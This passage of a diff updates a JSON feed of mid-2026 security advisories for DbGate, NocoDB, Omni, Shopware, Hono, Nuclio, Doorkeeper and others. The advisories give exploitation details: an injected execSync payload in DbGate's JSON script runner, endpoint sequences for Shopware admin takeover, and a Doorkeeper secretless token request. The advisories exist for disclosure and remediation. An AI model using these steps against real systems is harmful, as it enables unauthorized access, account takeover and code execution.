nullified):\nconst { execSync } = await import('child_process');\nexecSync('arbitrary command');\n```\n\n**Root cause:** `functionName` is user-controlled input that is interpolated into code without sanitization. The fix should validate `functionName` against an allowlist of known reader functions (e.g., `/^[a-zA-Z]+$/`) or use a lookup table instead of string interpolation.\n\n\n\n<br/>\n\n### PoC\n\nThe PoC can be run against a test environment using Docker Compose:\n\n```yaml\nservices:\n  sectest-dbgate:\n    image: dbgate/dbgate:7.1.4-alpine\n    ports:\n      - \"80:3000\"\n    ",
+      "link": "https://github.com/advisories/GHSA-wm5r-5qp3-5vxf",
+      "published": "2026-06-05T16:30:59Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-47670"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-47668",
+      "title": "DbGate: Unauthenticated Remote Code Execution via JSON Script Runner",
+      "summary": "### Summary\nDbGate's JSON script runner (`POST /runners/start`) allows remote code execution via code injection in the `functionName` parameter of JSON script `assign` commands. The `functionName` value is interpolated directly into dynamically generated JavaScript source code via string concatenation. The generated code is then executed in a forked Node.js child process.\n\n### Details\n#### Step 1: User Input Entry Point\n\n**File:** `packages/api/src/controllers/runners.js` - `start()` method\n\nThe `/runners/start` endpoint accepts a POST body containing a `script` object. When `script.type == 'json'`, the request follows a different code path than raw shell scripts:\n\n```javascript\nasync start({ script }, req) {\n    if (script.type == 'json') {\n        if (!platformInfo.isElectron) {\n            if (!checkSecureDirectoriesInScript(script)) {\n                return { errorMessage: 'Unallowed directories in script' };\n            }\n        }\n        logJsonRunnerScript(req, script);\n        const js = await jsonScriptToJavascript(script);\n        return this.startCore(runid, scriptTemplate(js, false));\n    }\n```\nThis path skips:\n1. The `run-shell-script` permission check\n2. The `allowShellScripting` platform-level check\n\nThe only validation performed is `checkSecureDirectoriesInScript()`, which `props.fileName` values\n\n---\n\n#### Step 2: JSON-to-JavaScript Conversion (Injection Point)\n\n**File:** `packages/tools/src/ScriptWriter.ts` - `assignCore()` method\n\nThe JSON script's `commands` array contains objects with `type: \"assign\"`. The `assignCore` method generates JavaScript by direct string concatenation of user-controlled values:\n\n```typescript\nassignCore(variableName, functionName, props) {\n    this._put(`const ${variableName} = await ${functionName}(${JSON.stringify(props)});`);\n}\n```\n\nBoth `variableName` and `functionName` are attacker-controlled values taken directly from the JSON request body and interpolated into the generated JavaScript source code.\n\n---\n\n#### Ste",
+      "link": "https://github.com/advisories/GHSA-8v3q-9vmx-36vc",
+      "published": "2026-06-05T16:25:23Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-47668"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-47381",
+      "title": "NocoDB: Cross-Workspace Integration Use in Connection Test",
+      "summary": "### Summary\nA user in one workspace could exercise another workspace's integration through the\n`testConnection` endpoint by supplying its ID, because the integration was fetched in\na bypass scope and the caller's permission check matched any base in any workspace.\n\n### Details\nThe connection-test endpoint fetched the integration in `RootScopes.BYPASS` scope and\nchecked only that the integration was non-private and that the caller held an\nowner/creator role on any base in any workspace. The permission lookup is now scoped\nto the integration's workspace by joining on `fk_workspace_id`, and the controller\nrejects requests where the integration's workspace differs from the request's workspace.\n\n### Impact\nCross-tenant access to integration configuration through the connection-test endpoint,\nincluding the ability to drive the resolved database with the other workspace's\ncredentials. Authentication with creator-or-owner role on any base in any workspace\nwas sufficient.\n\n### Credit\nThis issue was reported by [@DongyangLyu](https://github.com/DongyangLyu).",
+      "link": "https://github.com/advisories/GHSA-96fh-m4r8-6v9v",
+      "published": "2026-06-05T16:04:32Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-47381"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
+    },
+    {
+      "id": "CVE-2026-45726",
+      "title": "Omni: Reader-level users can retrieve imported cluster CA keys via ResourceService",
+      "summary": "## Summary\n\nOmni supports importing standalone Talos clusters.\n\nDuring this process, an ImportedClusterSecrets resource is created, which contains the full CA secrets bundle for the cluster being imported.\n\nIf these secrets are not rotated by the importing actor, an authenticated Omni user with Reader access can read this resource and gain full access to the Talos, Kubernetes and etcd APIs of the cluster.\n\n## Severity\n\n- **Attack Vector:** Adjacent: the attacker needs to be in the same network to be able to access Talos/Kubernetes APIs with the compromised keys.\n- **Attack Complexity:** High: the attacker needs a deep understanding of Omni's internals. The resource is only created for imported clusters, and is normally not represented to users via any high-level API.\n- **Privileges Required:** Low: the role `Reader` is sufficient for the attacker to be able to read an imported cluster's secrets.\n- **User Interaction:** Required: another user must have imported a cluster to Omni for this vulnerability to exist.\n- **Scope:** Changed: the leaked CA private keys let an attacker directly get full control on Kubernetes or Talos, beyond the limitations enforced by Omni.\n- **Confidentiality Impact:** High: full cluster CA private keys (Kubernetes, Talos, etcd, service account) are exposed.\n- **Integrity Impact:** High: with the CA keys the attacker has full control on Kubernetes and Talos of the compromised (imported) cluster, and modify the workloads on it.\n- **Availability Impact:** High: with the CA keys the attacker has full control on Kubernetes and Talos of the compromised (imported) cluster, and modify the workloads on it.\n\n## Impact\n\n- Any Reader-level account can exfiltrate the complete CA private key hierarchy (Kubernetes CA, etcd CA, service account key) of the imported clusters whose secrets are not yet rotated (\"tainted\" imported clusters).\n- With the Kubernetes CA private key, an attacker can sign certificates for any Kubernetes user or group, including `syste",
+      "link": "https://github.com/advisories/GHSA-wv8c-6mx2-xf4j",
+      "published": "2026-06-05T15:26:24Z",
+      "source": "GitHub Security Advisories",
+      "tags": [
+        "github",
+        "advisories",
+        "oss"
+      ],
+      "cve_ids": [
+        "CVE-2026-45726"
+      ],
+      "is_zero_day": false,
+      "is_high_severity": true
     },
     {
       "id": "https://thehackernews.com/2026/06/hackers-exploit-critical-everest-forms.html",
@@ -400,168 +563,6 @@
       ],
       "cve_ids": [
         "CVE-2026-48014"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-48010",
-      "title": "Shopware: Privilege escalation: non-admin user with user:create ACL can create admin accounts",
-      "summary": "`UserController::upsertUser()` writes user data in `SYSTEM_SCOPE` and does not filter the `admin` field. A non-admin API user with `user:create` or `user:update` ACL permission can set `admin: true` on new or existing users, escalating to full admin access.\n\n## The Problem\n\nIn `src/Core/Framework/Api/Controller/UserController.php`, line 210-234:\n\n```php\npublic function upsertUser(?string $userId, Request $request, Context $context, ResponseFactoryInterface $factory): Response\n{\n    $data = $request->request->all(); // raw request data, no field filtering\n    // ...\n    $events = $context->scope(Context::SYSTEM_SCOPE, fn (Context $context) =>\n        $this->userRepository->upsert([$data], $context)\n    );\n}\n```\n\n`SYSTEM_SCOPE` bypasses `AclWriteValidator` entirely (line 52 of `AclWriteValidator::preValidate()` returns early for `SYSTEM_SCOPE`). The `admin` boolean field is accepted without restriction.\n\nCompare with `IntegrationController::upsertIntegration()` in the same codebase, which correctly checks:\n\n```php\nif ((!$source instanceof AdminApiSource)\n    || (!$source->isAdmin()\n    && isset($data['admin']))\n) {\n    throw new PermissionDeniedException();\n}\n```\n\n`UserController` is missing this exact check.\n\n## Impact\n\nAny API user with the low-privilege `user:create` permission can create accounts with full admin access, or with `user:update` can promote any existing user to admin. This is a direct privilege escalation.\n\n## Suggested Fix\n\nAdd the same `isAdmin()` check from `IntegrationController`:\n\n```php\n$source = $context->getSource();\nif ((!$source instanceof AdminApiSource) || (!$source->isAdmin() && isset($data['admin']))) {\n    throw new PermissionDeniedException();\n}\n```\n\nBest regards,\nKeyvan Hardani",
-      "link": "https://github.com/advisories/GHSA-v39m-97p8-gqg7",
-      "published": "2026-06-04T19:28:29Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-48010"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-48009",
-      "title": "Shopware: Admin Account Takeover via User Recovery Hash Exposure",
-      "summary": "## Summary\n\nA low-privilege admin user with `user_recovery:read` ACL can take over any admin account. The attacker triggers password recovery for the victim (unauthenticated endpoint), reads the recovery hash from the Admin API search endpoint, then uses the hash to reset the victim's password (another unauthenticated endpoint). The recovery hash \u2014 intended to be secret and delivered only via email \u2014 is fully readable through the standard entity search API.\n\n**OWASP:** A01:2021 \u2014 Broken Access Control\n\n## Root Cause\n\nThe `user_recovery` entity exposes its `hash` field through the Admin API search endpoint (`POST /api/search/user-recovery`). The `hash` field lacks `ApiAware(false)` or `ReadProtection`, so any user with `user_recovery:read` ACL can read it.\n\nThe password recovery flow assumes the hash is delivered exclusively via email. The Admin API provides an alternative channel to obtain it, breaking this assumption.\n\n**Three endpoints combine to form the attack:**\n\n1. `POST /api/_action/user/user-recovery` \u2014 triggers recovery, creates hash in DB (**no auth required**)\n2. `POST /api/search/user-recovery` \u2014 reads the hash (**requires only `user_recovery:read` ACL**)\n3. `PATCH /api/_action/user/user-recovery/password` \u2014 resets password using hash (**no auth required**)\n\n**Vulnerable code:**\n- `src/Core/System/User/Recovery/UserRecoveryDefinition.php` \u2014 `hash` field is `ApiAware` with no `ReadProtection`\n\n## Impact\n\n- **Full admin account takeover** \u2014 attacker gains the highest privilege level in the system\n- **All admin capabilities** \u2014 user/role management, system configuration, plugin management, customer data access\n- **Cascading compromise** \u2014 taken-over admin account can be used to pivot to other attacks\n- **Low barrier** \u2014 `user_recovery:read` is a seemingly harmless permission that grants devastating access\n\n## Remediation\n\nRemove the `hash` field from API responses:\n\n```php\n// src/Core/System/User/Recovery/UserRecoveryDefinition.php\n(new StringField('hash', ",
-      "link": "https://github.com/advisories/GHSA-8v9p-g828-v98f",
-      "published": "2026-06-04T19:27:15Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-48009"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-48008",
-      "title": "Shopware: Privilege Escalation via Sync API Integration Admin Flag Bypass",
-      "summary": "## Summary\n\nA non-admin API user with `integration:create` ACL privilege can escalate to full administrator by creating an integration with `admin: true` through the Sync API (`POST /api/_action/sync`). The regular integration endpoint (`POST /api/integration`) correctly blocks this, but the Sync API bypasses the controller-level check by writing directly through the DAL EntityWriter. The `integration` entity definition lacks `WriteProtection`, and the `admin` field has no field-level restriction flag.\n\n**OWASP:** A01:2021 \u2014 Broken Access Control\n\n## Root Cause\n\n`IntegrationController::upsertIntegration()` checks `$source->isAdmin()` before allowing the `admin` field to be set. However, `SyncController::sync()` routes writes through `SyncService \u2192 EntityWriter`, which only applies:\n\n1. `AclWriteValidator` \u2014 checks entity-level ACL (`integration:create` is sufficient)\n2. `EntityProtectionValidator` \u2014 checks `WriteProtection` on entity definitions, but `IntegrationDefinition` has none\n\nThe `admin` field in `IntegrationDefinition` is a plain `BoolField` with no `WriteProtection` or special flag. The Sync API writes it without restriction.\n\n**Vulnerable code path:**\n- `src/Core/Framework/Api/Controller/SyncController.php` \u2192 `SyncService` \u2192 `EntityWriter::upsert()`\n- **Missing protection:** `src/Core/Framework/Integration/IntegrationDefinition.php` \u2014 `admin` field has no `WriteProtection(Context::SYSTEM_SCOPE)`\n\n**Working protection (bypassed):**\n- `src/Core/Framework/Integration/IntegrationController.php:46-56` \u2014 `isAdmin()` check only applies to the dedicated controller endpoint\n\n## Impact\n\n- **Complete admin API access** \u2014 the escalated integration has full read/write on every entity: users, customers, orders, system configuration, integrations, plugins\n- **PII exfiltration** \u2014 read all customer records (names, emails, addresses, order history)\n- **Persistent backdoor** \u2014 the admin integration survives password changes and user deactivation\n\n## Remediation\n\nAdd `Write",
-      "link": "https://github.com/advisories/GHSA-gv8p-48fr-4fxg",
-      "published": "2026-06-04T19:23:33Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-48008"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47673",
-      "title": "Hono: JWT middleware accepts any Authorization scheme, not only Bearer",
-      "summary": "### Summary\n\nThe `jwt` and `jwk` middlewares do not verify that the `Authorization` header value uses the`Bearer` scheme. Any two-part header value \u2014 regardless of the scheme name in the first position \u2014 proceeds to JWT verification. A request presenting a valid JWT under a non-`Bearer` scheme identifier (such as `Basic` or `Token`) is authenticated identically to a correctly formed `Bearer` request.\n\n### Details\n\nWhen processing an `Authorization` (or custom) header, the middleware splits the value on whitespace and uses the second token as the JWT to verify. It does not check that the first token is `bearer` (case-insensitively). RFC 6750 specifies that JWT bearer tokens must be presented using the `Bearer` scheme; other scheme identifiers carry distinct semantics and may be subject to different policies in network-layer security controls.\n\nThis discrepancy means that scheme-aware external controls \u2014 such as WAF rules, API gateways, or reverse proxies that apply policies specific to the `Bearer` scheme identifier \u2014 can be bypassed by presenting a valid JWT under a different scheme name.\n\nThis issue affects `hono/jwt` and `hono/jwk` middleware.\n\n### Impact\n\nAn attacker who possesses a valid JWT may present it under a non-`Bearer` scheme identifier and still pass middleware authentication.\n\nThis may lead to:\n\n- Bypass of network-layer security controls that inspect or filter requests based on the authorization scheme identifier\n- Token reuse across authentication schemes in applications that use multiple authorization mechanisms\n\nThis issue affects applications where `hono/jwt` or `hono/jwk` authentication is combined with external controls that enforce scheme-based access policies.",
-      "link": "https://github.com/advisories/GHSA-f577-qrjj-4474",
-      "published": "2026-06-04T17:52:04Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47673"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47672",
-      "title": "epa4all-client: Unauthenticated REST API for Patient Record Writes",
-      "summary": "### Impact\nAny network-reachable caller can write arbitrary documents to any patient's electronic\nhealth record accessible by the institution's SMC-B card. In a misconfigured deployment\n(e.g., following the production Docker example in the README), this is exploitable from\nthe local network without credentials.\n\n### Patches\n- [#43](https://github.com/oviva-ag/epa4all-client/pull/43)\n\n### Workarounds\nUse network policies or proxies to enforce service-to-service authentication via e.g. mTLS.\n- run the service in an isolated network namespace e.g. as Kubernetes sidecar\n- service-mesh with corresponding policies\n\n### References\n- MS-OVIVA-EPA4ALL-8b2af7\n\n\n### Credits\n[Machine Spirits](https://machinespirits.com/) ([contact@machinespirits.de](mailto:contact@machinespirits.de))\n\n- Dr. rer. nat. Simon Weber\n- Dipl.-Inf. Volker Sch\u00f6nefeld\n- Chiara Fliegner",
-      "link": "https://github.com/advisories/GHSA-c82x-f4xr-qv33",
-      "published": "2026-06-04T17:49:29Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47672"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-47671",
-      "title": "Nhost CLI local configserver allows cross-origin unauthenticated read/write access to local development configuration and secrets",
-      "summary": "### Summary\n\nThe hidden `nhost configserver` used by `nhost dev` exposes the Mimir GraphQL API with dummy authorization directives and permissive CORS. When a developer is running the local development environment, any process that can reach the developer's localhost service, including a web page loaded from an arbitrary origin, can query the configserver for local Nhost configuration and secrets and can mutate the local `.secrets` file.\n\nThis impacts developers using `nhost dev`: project admin secrets, JWT signing keys, webhook secrets, Grafana credentials, and custom environment variables can be read, and attacker-controlled secrets can be written to the local development project.\n\n### Details\n\nThe CLI registers a hidden `configserver` command in `cli/main.go:39` and `cli/main.go:41`. That command is used as the local development configserver image in `nhost dev`: `cli/cmd/dev/up.go:176` through `cli/cmd/dev/up.go:200` select `nhost/cli:<version>` as the configserver image, and `cli/dockercompose/configserver.go:80` through `cli/dockercompose/configserver.go:84` run it with the `configserver` command. The generated development dashboard receives the configserver and logs GraphQL URLs in public client-side environment variables at `cli/dockercompose/compose.go:347` through `cli/dockercompose/compose.go:358`.\n\nThe configserver intentionally loads the local project files into Mimir's GraphQL resolver in `cli/cmd/configserver/configserver.go:143` through `cli/cmd/configserver/configserver.go:156`. However, the authorization directives passed to `graph.SetupRouter` are no-ops:\n\n- `cli/cmd/configserver/configserver.go:83` through `cli/cmd/configserver/configserver.go:89` define `dummyMiddleware`, which calls the next resolver without checking app visibility.\n- `cli/cmd/configserver/configserver.go:91` through `cli/cmd/configserver/configserver.go:98` define `dummyMiddleware2`, which calls the next resolver without checking roles.\n- `cli/cmd/configserver/configserver.go:",
-      "link": "https://github.com/advisories/GHSA-64cj-qvx5-m4f3",
-      "published": "2026-06-04T17:43:40Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-47671"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-45730",
-      "title": "Nuclio: Missing authorization on project write paths allows any authenticated user to modify or delete any project",
-      "summary": "This vulnerability exists in Nuclio Dashboard's project management API, allowing any authenticated user (without membership in the target project) to bypass OPA authorization checks on write paths (`PUT /api/projects/{id}`, `DELETE /api/projects`) and modify or delete any project along with all its associated resources (functions, API gateways, etc.). CWE classification: CWE-862 (Missing Authorization).\n\n---\n\n## Summary\n\nNuclio Dashboard correctly enforces OPA-based authorization on the project read path (`GET /api/projects`), populating `MemberIds` in `PermissionOptions` so OPA can filter results by user membership. However, the write paths (`PUT /api/projects/{id}` and `DELETE /api/projects`) construct `PermissionOptions` without setting `MemberIds`. The platform-layer `FilterProjectsByPermissions` function (`pkg/platform/abstract/platform.go:652`) short-circuits when `MemberIds` is empty, bypassing OPA entirely. Any authenticated user who knows a project name can modify or delete that project, triggering cascading deletion of all associated Functions, APIGateways, and FunctionEvents.\n\nAffected: Nuclio v1.15.26 (latest Helm release) and HEAD commit e185454 (latest source).\n\n---\n\n## Attacker Model\n\n**Attacker type**: Authenticated low-privilege tenant (no membership in the target project)\n\n**Initial access**:\n- Holds any valid Nuclio Dashboard credentials\n- The account has no membership in the target project (OPA correctly denies `GET /api/projects`, returning an empty list)\n- No Kubernetes RBAC permissions required \u2014 the vulnerability is triggered at the Dashboard application layer, not via K8s API Server\n\n**Attacker location**: Authenticated user; network position depends on deployment:\n- Typical Iguazio/MLRun enterprise deployment: Dashboard is exposed via load balancer to internal or public networks\n- Self-hosted deployment: Dashboard is usually limited to cluster-internal or internal network access\n- Conservative baseline: authenticated-internal; for public-fa",
-      "link": "https://github.com/advisories/GHSA-m8xg-8xg9-mxhm",
-      "published": "2026-06-04T15:05:56Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45730"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-45056",
-      "title": "Matrix Rust SDK: Sender-binding gaps in to-device and room-key attribution",
-      "summary": "### Impact\n\nThe `matrix-sdk-crypto` crate before 0.16.1 is missing a check for the sender's user ID when decrypting an Olm-encrypted to-device message containing the `sender_device_keys` property.\n\nThis could be exploited to spoof the sender of an encrypted to-device message, but only if the attacker colludes with (or is) the homeserver operator.\n\n### Patches\n\nThis issue is fixed in `matrix-sdk-crypto` 0.16.1.\n\n### Workarounds\n\nThere are no known workarounds for the issue.\n\n### References\n\nThis issue was fixed in https://github.com/matrix-org/matrix-rust-sdk/pull/6553.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please email us at [security at matrix.org](mailto:security@matrix.org).",
-      "link": "https://github.com/advisories/GHSA-wfq4-36m3-9g42",
-      "published": "2026-06-04T14:47:05Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-45056"
-      ],
-      "is_zero_day": false,
-      "is_high_severity": true
-    },
-    {
-      "id": "CVE-2026-44476",
-      "title": "Doorkeeper Openid Connect: Dynamic Client Registration feature creates public clients with client_secret",
-      "summary": "### Impact\n\nThe `DynamicClientRegistrationController#register` action hard-codes `confidential: false` when creating applications (dynamic_client_registration_controller.rb:18-25), yet the response includes a client_secret and advertises `token_endpoint_auth_methods_supported: [\"client_secret_basic\", \"client_secret_post\"]`.\n\nBecause Doorkeeper's `Application.by_uid_and_secret` treats a blank/missing secret as valid for non-confidential (public) clients, an\nattacker who knows only the client_id (which is public information) can authenticate as the dynamically-registered client at the token endpoint.\n\n**Note** that Dynamic Client Registration is opt-in feature which is disabled by default so only projects that explicitly enabled it are affected.\n\n**Steps to Reproduce**\n\n1. Enable dynamic client registration in the initializer\n2. POST /oauth/registration with client_name, redirect_uris, and scope\n3. Observe: response returns client_secret, but the created\nDoorkeeper::Application has confidential: false\n4. Call `Doorkeeper::Application.by_uid_and_secret(client_id, nil)` \u2014 it\nreturns the application (credentials bypass)\n5. POST /oauth/token with grant_type=client_credentials and only\nclient_id (no client_secret) \u2014 the token endpoint issues an access token\nwithout any secret verification\n\n\n### Patches\nPatched in 1.10.0\n\n### Workarounds\nUpgrade existing applications created with a Dynamic Client registration to have `confidential: true`",
-      "link": "https://github.com/advisories/GHSA-m6vc-f87m-cc2h",
-      "published": "2026-06-04T14:37:11Z",
-      "source": "GitHub Security Advisories",
-      "tags": [
-        "github",
-        "advisories",
-        "oss"
-      ],
-      "cve_ids": [
-        "CVE-2026-44476"
       ],
       "is_zero_day": false,
       "is_high_severity": true
